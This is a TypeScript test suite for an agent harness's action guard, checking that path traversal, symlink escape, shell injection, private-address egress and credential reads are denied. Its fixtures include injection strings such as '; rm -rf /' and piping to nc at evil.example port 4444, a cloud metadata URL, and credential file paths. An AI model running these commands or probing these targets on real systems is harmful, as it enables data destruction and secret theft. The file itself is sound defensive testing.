// RED tests for W10 M-01 guarded-mutation path/argv/env rules + fail-closed
// scan-state (flow 013, dispatch 013-T5, task-M-01, reviewer track: security).
//
// Pins the structural-guard half of the frozen guarded-mutation contract per
// `docs/requirements/keryx-project-agent-harness/acceptance.feature`:
//   - @SC_R15_READ_WITHIN_ROOT              "Allow a read within the approved worktree"
//   - @SC_R15_CREDENTIAL_REQUEST_DENIED     "Deny direct credential access"
//   - @SC_R15_PATH_TRAVERSAL_DENIED         "Deny path traversal and symlink escape"
//   - @SC_R15_SYMLINK_ESCAPE_DENIED         "Reject a symlink that escapes the worktree"
//   - @SC_R15_SHELL_INJECTION_DENIED        "Deny shell injection"
//   - @SC_R15_REDIRECT_PRIVATE_ADDRESS_DENIED "Deny redirect and private-address egress"
//   - @SC_R15_FAIL_CLOSED_ISOLATION         "Fail closed when required isolation is unavailable"
// and `docs/decisions/keryx-harness/ADR-0003-d03-security-profiles-containment.md`
// (fail-closed posture; path canonicalization/argv-over-shell/env-allowlisting
// apply to every tier that permits mutation or shell).
//
// M-01 impl (next dispatch) implements `src/harness/mutation/guard.ts`
// (`GuardOutcome`, `guardAction`) to make this suite GREEN; until then the
// missing-module import below is the expected RED failure ("Cannot find
// module './guard'").
//
// Scenario -> test mapping:
//   9.  path traversal / symlink escape -> describe("guardAction — path traversal / symlink escape denied ...")
//   10. shell injection                 -> describe("guardAction — shell injection denied ...")
//   11. redirect / private-address      -> describe("guardAction — redirect / private-address egress denied ...")
//   12. credential access               -> describe("guardAction — direct credential access denied ...")
//   13. read within root                -> describe("guardAction — read within the approved root is allowed ...")
//   14. fail-closed scan                -> describe("guardAction — fail-closed when required isolation/scan is unavailable ...")
//
// ---------------------------------------------------------------------------
// API DELTA vs. the dispatch's pinned sketch:
//
// `guardAction`'s `input` in the dispatch sketch is
// `{ spec, worktreeRoot, profile, interactive, scanAvailable, resolveSymlink? }`
// with no risk classification. But `guardAction` is specified to "else compose
// W3 decide" — and `decide(call: { toolCallId; risk: ToolRisk }, ctx, deps)`
// (`src/harness/policy/engine.ts`) REQUIRES a `ToolRisk` to resolve the
// profile baseline. `ActionSpec` (`{ path; argv; env }`) carries no risk
// field, so this suite adds a required `risk: ToolRisk` field to
// `guardAction`'s `input` (see the local `GuardTestInput` type below) — M-01
// impl must accept it. This is the only addition to the pinned surface; no
// other field is renamed or removed.
//
// Precedence pinned by this suite (mirrors the dispatch's stated order — "deny
// on path-traversal/symlink-escape/shell-injection/private-address/credential;
// deny fail-closed when scanAvailable=false; else compose W3 decide"):
//   1. path traversal / symlink escape -> deny
//   2. shell injection (argv metacharacters) -> deny
//   3. private/loopback/link-local/metadata egress destination in argv -> deny
//   4. direct credential access (sensitive path OR unrestricted env dump) -> deny
//   5. scanAvailable === false -> deny (fail-closed; checked regardless of
//      profile permissiveness — proven by the "denies even when the
//      unguarded outcome would allow" test below)
//   6. otherwise: composes `decide()` under the supplied profile/risk/context
//      and maps its outcome (`allow` -> `{kind:"allow"}`, anything else ->
//      `{kind:"deny", reason}`).
//
// Structural heuristics THIS suite pins (no frozen schema defines these; M-01
// impl must satisfy them exactly since these are the only executable spec for
// AC2 path/argv/credential/network rules):
//   - Shell injection: any argv token containing a shell metacharacter from
//     the set `; & | ` $ ( ) < >` is denied (argv-over-shell: a single argv
//     element must never carry shell-interpretable syntax).
//   - Private/loopback/link-local/metadata egress: any argv token containing
//     one of `127.0.0.1`, `169.254.169.254`, `10.` / `172.16.` / `192.168.`
//     (RFC1918), or `localhost` as a host is denied.
//   - Credential access: (a) `spec.path` containing (case-insensitively) one
//     of `.env`, `credentials`, `.ssh/`, `id_rsa`, or `.pem` is denied; OR
//     (b) `spec.argv` is exactly `["env"]` or `["printenv"]` (an unrestricted
//     environment snapshot) is denied.
//   - Path traversal / symlink escape: `spec.path`, once resolved against
//     `worktreeRoot` (and, when `resolveSymlink` is supplied, further resolved
//     through it), must remain within `worktreeRoot`; any escape is denied
//     BEFORE the target is opened.
//
// Deterministic: `deps.clock`/`deps.idSeq` are fixed via `makeDeps()` (mirrors
// `src/harness/policy/engine.test.ts`); no `Date.now()`, `Math.random()`, or
// network anywhere in this file. NO real fs: `resolveSymlink` is injected data,
// never a real filesystem call.
import { createHash } from "node:crypto";
import { describe, expect, test } from "bun:test";
import type { ToolRisk } from "../tool/types";
import type { PolicyProfile } from "../policy/types";

// PINNED API under test — M-01 impl exports these from "./guard"; the import
// fails until then (expected RED: "Cannot find module './guard'").
import { guardAction, type GuardOutcome } from "./guard";
import type { ActionSpec } from "./fingerprint";

function sha256(input: string): string {
  return createHash("sha256").update(input, "utf8").digest("hex");
}

// ---------------------------------------------------------------------------
// Deterministic deps: fixed clock, fresh monotonic id sequence per call.
// Mirrors `src/harness/policy/engine.test.ts` `makeDeps()`.
// ---------------------------------------------------------------------------
function makeDeps(): { clock: () => string; idSeq: () => string } {
  let counter = 0;
  return {
    clock: () => "2026-01-01T00:00:00.000Z",
    idSeq: () => `id-${counter++}`,
  };
}

// ---------------------------------------------------------------------------
// Policy profile fixtures — shaped exactly per `policy-profile.schema.json`,
// mirrors `src/harness/policy/engine.test.ts`. No invented profile.
// ---------------------------------------------------------------------------
const readOnlyProfile: PolicyProfile = {
  schemaVersion: 1,
  profileId: "read-only-review",
  profileVersion: "1.0.0",
  fingerprint: sha256("read-only-review:1.0.0"),
  trustMode: "read-only",
  defaults: { read: "allow", write: "deny", shell: "deny", network: "deny", delegate: "deny" },
  requiredControls: { isolation: "not-required", redactionFailure: "deny", networkBrokerFailure: "deny" },
};

const monitoredProfile: PolicyProfile = {
  schemaVersion: 1,
  profileId: "monitored-trusted-local",
  profileVersion: "1.0.0",
  fingerprint: sha256("monitored-trusted-local:1.0.0"),
  trustMode: "trusted-local",
  defaults: { read: "allow", write: "ask", shell: "ask", network: "ask", delegate: "ask" },
  requiredControls: { isolation: "not-required", redactionFailure: "deny", networkBrokerFailure: "deny" },
};

// ---------------------------------------------------------------------------
// Action-spec / guard-input builders.
// ---------------------------------------------------------------------------
const worktreeRoot = "/repo/worktree";

function makeSpec(overrides: Partial<ActionSpec> = {}): ActionSpec {
  return {
    path: `${worktreeRoot}/src/index.ts`,
    argv: ["cat", `${worktreeRoot}/src/index.ts`],
    env: {},
    ...overrides,
  };
}

// See API DELTA above: `risk` is required here because `decide()` needs it
// and `ActionSpec` carries none.
interface GuardTestInput {
  spec: ActionSpec;
  worktreeRoot: string;
  profile: PolicyProfile;
  interactive: boolean;
  scanAvailable: boolean;
  risk: ToolRisk;
  resolveSymlink?: (p: string) => string;
}

function baseGuardInput(overrides: Partial<GuardTestInput> = {}): GuardTestInput {
  return {
    spec: makeSpec(),
    worktreeRoot,
    profile: readOnlyProfile,
    interactive: true,
    scanAvailable: true,
    risk: "read",
    ...overrides,
  };
}

function denyReason(outcome: GuardOutcome): string {
  if (outcome.kind !== "deny") {
    throw new Error(`Expected a deny outcome, got ${outcome.kind}`);
  }
  return outcome.reason;
}

// === 9. Path traversal / symlink escape (SC_R15_PATH_TRAVERSAL_DENIED / SC_R15_SYMLINK_ESCAPE_DENIED) ===

describe("guardAction — path traversal / symlink escape denied (SC_R15_PATH_TRAVERSAL_DENIED / SC_R15_SYMLINK_ESCAPE_DENIED)", () => {
  test("a path containing .. that resolves outside the worktree root is denied before access", () => {
    const escapee = `${worktreeRoot}/../outside/secret.txt`;
    const outcome = guardAction(
      baseGuardInput({ spec: makeSpec({ path: escapee, argv: ["cat", escapee] }) }),
      makeDeps(),
    );
    expect(outcome.kind).toBe("deny");
    expect(denyReason(outcome)).toMatch(/travers|escape|outside/i);
  });

  test("an absolute path entirely outside the worktree root is denied", () => {
    const outcome = guardAction(
      baseGuardInput({ spec: makeSpec({ path: "/etc/passwd", argv: ["cat", "/etc/passwd"] }) }),
      makeDeps(),
    );
    expect(outcome.kind).toBe("deny");
  });

  test("a symlink that resolves outside the approved root is denied before opening the target", () => {
    const inRootLookingPath = `${worktreeRoot}/link-to-outside`;
    const outcome = guardAction(
      baseGuardInput({
        spec: makeSpec({ path: inRootLookingPath, argv: ["cat", inRootLookingPath] }),
        resolveSymlink: () => "/etc/passwd",
      }),
      makeDeps(),
    );
    expect(outcome.kind).toBe("deny");
    expect(denyReason(outcome)).toMatch(/symlink|escape/i);
  });

  test("a symlink that resolves to a path still inside the root is not denied on this ground", () => {
    const inRootPath = `${worktreeRoot}/link-to-inside`;
    const outcome = guardAction(
      baseGuardInput({
        spec: makeSpec({ path: inRootPath, argv: ["cat", inRootPath] }),
        resolveSymlink: (resolved) => resolved,
      }),
      makeDeps(),
    );
    expect(outcome).toEqual({ kind: "allow" });
  });
});

// === 10. Shell injection (SC_R15_SHELL_INJECTION_DENIED) ===================

describe("guardAction — shell injection denied (SC_R15_SHELL_INJECTION_DENIED)", () => {
  test("argv tokens carrying shell metacharacters are denied before a second command can be injected", () => {
    const injectionArgvs: string[][] = [
      ["ls", "; rm -rf /"],
      ["echo", "`whoami`"],
      ["echo", "$(cat /etc/passwd)"],
      ["build", "a && curl evil.example"],
      ["run", "a | nc evil.example 4444"],
      ["run", "output > /etc/passwd"],
    ];
    for (const argv of injectionArgvs) {
      const outcome = guardAction(
        baseGuardInput({ spec: makeSpec({ argv }), risk: "shell", profile: monitoredProfile }),
        makeDeps(),
      );
      expect(outcome.kind).toBe("deny");
      expect(denyReason(outcome)).toMatch(/shell|inject/i);
    }
  });

  test("a plain argv array with no shell metacharacters is not denied on this ground", () => {
    const outcome = guardAction(
      baseGuardInput({ spec: makeSpec({ argv: ["ls", "-la", "src"] }), risk: "read" }),
      makeDeps(),
    );
    expect(outcome).toEqual({ kind: "allow" });
  });
});

// === 11. Redirect / private-address egress (SC_R15_REDIRECT_PRIVATE_ADDRESS_DENIED) ===

describe("guardAction — redirect / private-address egress denied (SC_R15_REDIRECT_PRIVATE_ADDRESS_DENIED)", () => {
  test("argv containing a private, loopback, link-local, or metadata destination is denied at the connection boundary", () => {
    const privateDestinations = [
      "http://127.0.0.1/admin",
      "http://169.254.169.254/latest/meta-data/",
      "http://10.0.0.5/internal",
      "http://192.168.1.5/internal",
      "http://172.16.0.5/internal",
      "http://localhost:8080/admin",
    ];
    for (const url of privateDestinations) {
      const outcome = guardAction(
        baseGuardInput({ spec: makeSpec({ argv: ["curl", url] }), risk: "network", profile: monitoredProfile }),
        makeDeps(),
      );
      expect(outcome.kind).toBe("deny");
      expect(denyReason(outcome)).toMatch(/private|loopback|metadata|link-local|address/i);
    }
  });

  test("a public https destination is not denied on this ground", () => {
    const outcome = guardAction(
      baseGuardInput({
        spec: makeSpec({ argv: ["curl", "https://api.example.com/v1/status"] }),
        risk: "network",
        profile: monitoredProfile,
      }),
      makeDeps(),
    );
    // Not denied for a PRIVATE-ADDRESS reason specifically; the overall
    // decision may still be `ask`/`deny` via the composed `decide()` policy
    // path (monitoredProfile defaults network to "ask" -> headless/interactive
    // dependent), so this only asserts the private-address reason is absent.
    if (outcome.kind === "deny") {
      expect(outcome.reason).not.toMatch(/private|loopback|metadata|link-local/i);
    }
  });
});

// === 12. Credential access (SC_R15_CREDENTIAL_REQUEST_DENIED) ==============

describe("guardAction — direct credential access denied (SC_R15_CREDENTIAL_REQUEST_DENIED)", () => {
  test("a path targeting a known credential/secret file is denied and no value is persisted", () => {
    const credentialPaths = [
      `${worktreeRoot}/.env`,
      `${worktreeRoot}/.aws/credentials`,
      `${worktreeRoot}/.ssh/id_rsa`,
      `${worktreeRoot}/keys/server.pem`,
    ];
    for (const credPath of credentialPaths) {
      const outcome = guardAction(
        baseGuardInput({ spec: makeSpec({ path: credPath, argv: ["cat", credPath] }) }),
        makeDeps(),
      );
      expect(outcome.kind).toBe("deny");
      expect(denyReason(outcome)).toMatch(/credential|secret/i);
    }
  });

  test("an unrestricted environment snapshot request (env/printenv dump) is denied", () => {
    for (const argv of [["env"], ["printenv"]]) {
      const outcome = guardAction(baseGuardInput({ spec: makeSpec({ argv }) }), makeDeps());
      expect(outcome.kind).toBe("deny");
      expect(denyReason(outcome)).toMatch(/credential|environment|secret/i);
    }
  });
});

// === 13. Read within root allowed (SC_R15_READ_WITHIN_ROOT) ================

describe("guardAction — read within the approved root is allowed (SC_R15_READ_WITHIN_ROOT)", () => {
  test("a canonical read-only path inside the approved worktree, with no other risk signal, is allowed", () => {
    const outcome = guardAction(baseGuardInput(), makeDeps());
    expect(outcome).toEqual({ kind: "allow" });
  });

  test("a nested read path inside the approved worktree is allowed", () => {
    const nested = `${worktreeRoot}/src/nested/deep/file.ts`;
    const outcome = guardAction(
      baseGuardInput({ spec: makeSpec({ path: nested, argv: ["cat", nested] }) }),
      makeDeps(),
    );
    expect(outcome).toEqual({ kind: "allow" });
  });
});

// === 14. Fail-closed scan / isolation unavailable (SC_R15_FAIL_CLOSED_ISOLATION) ===

describe("guardAction — fail-closed when required isolation/scan is unavailable (SC_R15_FAIL_CLOSED_ISOLATION)", () => {
  test("scanAvailable=false denies an otherwise-permitted read, never a silent allow", () => {
    const outcome = guardAction(baseGuardInput({ scanAvailable: false }), makeDeps());
    expect(outcome.kind).toBe("deny");
    expect(denyReason(outcome)).toMatch(/scan|isolation/i);
  });

  test("scanAvailable=false denies even under a profile/risk combination that would otherwise resolve to allow", () => {
    const outcome = guardAction(
      baseGuardInput({ scanAvailable: false, profile: readOnlyProfile, risk: "read", interactive: true }),
      makeDeps(),
    );
    expect(outcome.kind).toBe("deny");
  });

  test("no permission prompt / interactivity can bypass the fail-closed scan boundary", () => {
    const interactiveOutcome = guardAction(
      baseGuardInput({ scanAvailable: false, interactive: true }),
      makeDeps(),
    );
    const headlessOutcome = guardAction(
      baseGuardInput({ scanAvailable: false, interactive: false }),
      makeDeps(),
    );
    expect(interactiveOutcome.kind).toBe("deny");
    expect(headlessOutcome.kind).toBe("deny");
  });
});
